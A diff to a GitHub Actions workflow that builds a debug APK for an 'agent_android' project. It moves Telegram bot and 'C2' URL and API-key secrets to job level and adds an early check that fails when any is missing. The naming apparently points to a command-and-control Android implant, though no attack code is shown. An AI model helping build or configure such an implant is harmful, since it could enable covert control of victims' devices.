@@ -18,6 +18,15 @@ jobs:
       run:
         working-directory: agent_android
 
+    # Declared once at job level on purpose. Repeating this list on
+    # individual steps is exactly how the build ended up running once with
+    # the secrets scoped to the wrong step and gradle seeing nothing.
+    env:
+      TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
+      TG_CHAT_ID:   ${{ secrets.TG_CHAT_ID }}
+      C2_API_KEY:   ${{ secrets.C2_API_KEY }}
+      C2_URL:       ${{ secrets.C2_URL }}
+
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
@@ -27,6 +36,23 @@ jobs:
         with:
           distribution: temurin
           java-version: '17'
+
+      # Cheap and fails fast: no reason to install an SDK or generate a
+      # wrapper before finding out a secret was never configured.
+      - name: Verify build secrets are present
+        run: |
+          set -uo pipefail
+          missing=0
+          for name in TG_BOT_TOKEN TG_CHAT_ID C2_API_KEY C2_URL; do
+            if [ -z "${!name:-}" ]; then
+              echo "::error::repository secret '$name' is not set (Settings → Secrets and variables → Actions)"
+              missing=1
+            fi
+          done
+          if [ "$missing" -ne 0 ]; then
+            exit 1
+          fi
+          echo "all 4 build secrets present"
 
       # Installs a Gradle distribution and puts `gradle` on PATH. It does NOT
       # create ./gradlew for us — see the next step.
@@ -39,7 +65,7 @@ jobs:
       # Generated in a throwaway project rather than in agent_android so this
       # step never has to configure the Android build: no SDK lookup, no AGP
       # resolution, no chance of the wrapper task failing for unrelated
-      # reasons. Only the three wrapper files are copied back.
+      # reasons. Only the wrapper files are copied back.
       - name: Generate Gradle wrapper
         env:
           GRADLE_VERSION: '8.4'
@@ -68,8 +94,8 @@ jobs:
           # the installed Gradle happens to accept. The wrapper verifies this
           # on every distribution download.
           props="$target/gradle/wrapper/gradle-wrapper.properties"
-          grep -v '^distributionSha256Sum=' "$seed/gradle/wrapper/gradle-wrapper.properties" \
-            > "$props"
+          grep -v '^distributionSha256Sum=' \
+            "$seed/gradle/wrapper/gradle-wrapper.properties" > "$props"
           echo "distributionSha256Sum=$GRADLE_SHA256" >> "$props"
 
           chmod +x "$target/gradlew"
@@ -97,21 +123,8 @@ jobs:
       - name: Write local.properties
         run: echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
 
-      # build.gradle throws on any missing value, so this fails the job
-      # instead of quietly baking "placeholder" into the APK.
-      - name: Verify build secrets are present
-        env:
-          TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
-          TG_CHAT_ID:   ${{ secrets.TG_CHAT_ID }}
-          C2_API_KEY:   ${{ secrets.C2_API_KEY }}
-          C2_URL:       ${{ secrets.C2_URL }}
-        run: |
-          missing=0
-          for name in TG_BOT_TOKEN TG_CHAT_ID C2_API_KEY C2_URL; do
-            if [ -z "${!name}" ]; then echo "::error::secret $name is not set"; missing=1; fi
-          done
-          [ "$missing" -eq 0 ]
-
+      # Inherits the job-level env, so requireEnv() in app/build.gradle
+      # resolves against the same values the verification step checked.
       - name: Build debug APK
         run: ./gradlew assembleDebug --no-daemon --stacktrace
 
